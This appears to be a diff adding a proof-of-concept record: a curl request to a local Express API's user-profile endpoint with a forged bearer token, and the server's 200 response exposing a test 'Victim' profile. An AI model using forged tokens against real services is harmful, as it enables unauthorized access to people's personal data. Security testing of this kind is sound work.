@@ -1,0 +1,16 @@
+﻿
+curl.exe -i http://localhost:5000/api/users/profile `
+  -H "Authorization: Bearer $FORGED"
+
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Content-Type: application/json; charset=utf-8
+Content-Length: 253
+ETag: W/"fd-xCZ5aJc7zhkXUrkwzRc/YTM33Z8"
+Date: Sun, 27 Sep 2026 08:20:31 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{"_id":"6ab8c34778abdbeba12c853f","name":"Victim","email":"victim@gmail.com","phoneNumber":"0719999999","city":"Kandy","googleEmailVerified":false,"profilePicture":"","createdAt":"2026-09-27T07:18:31.929Z","updatedAt":"2026-09-27T07:18:31.929Z","__v":0}
